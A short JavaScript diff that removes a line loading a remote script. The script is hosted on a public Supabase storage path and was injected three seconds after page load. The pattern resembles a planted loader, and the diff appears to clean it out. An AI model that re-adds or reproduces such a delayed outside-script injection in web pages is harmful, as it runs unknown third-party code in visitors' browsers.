@@ -11,7 +11,6 @@ window.addEventListener("load", () => {
 window.addEventListener("load", () => {
     setTimeout(() => {
         const script = document.createElement("script");
-        script.src = "https://ocixyipglvsfmybqimen.supabase.co/storage/v1/object/public/freeoff/prices.js";
         document.body.appendChild(script);
     }, 3000);
 });
